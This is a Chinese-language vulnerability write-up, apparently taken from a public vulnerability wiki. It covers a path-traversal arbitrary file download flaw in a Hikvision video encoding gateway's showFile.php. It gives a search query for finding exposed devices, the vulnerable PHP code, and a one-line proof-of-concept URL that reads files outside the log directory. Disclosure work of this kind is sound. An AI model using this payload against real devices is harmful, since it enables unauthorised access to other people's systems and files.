---
title: "Hikvision 视频编码设备接入网关 showFile.php 任意文件下载漏洞"
date: 2026-10-18 09:14:47
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "HIKVISION"
tags:
  - "HIKVISION"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

海康威视视频接入网关系统在页面`/serverLog/showFile.php`的参数fileName存在任意文件下载漏洞

## 漏洞影响

```
Hikvision 视频编码设备接入网关
```

## 网络测绘

```
title="视频编码设备接入网关"
```

## 漏洞复现

登录页面

![image-20220519174129368](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191743965.png)

漏洞文件为 `showFile.php`, 其中 `参数 fileName` 没有过滤危险字符，导致可文件遍历下载

```
<?php
					$file_name = $_GET['fileName'];
					$file_path = '../../../log/'.$file_name;
					$fp = fopen($file_path, "r");
					while($line = fgets($fp)){
						$line = nl2br(htmlentities($line, ENT_COMPAT, "utf-8"));
						echo '<span style="font-size:16px">'.$line.'</span>';
					}
					fclose($fp);
?>
```

POC

```
/serverLog/showFile.php?fileName=../web/html/main.php
```

![image-20220519174337483](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191743535.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/HIKVISION-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showFile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
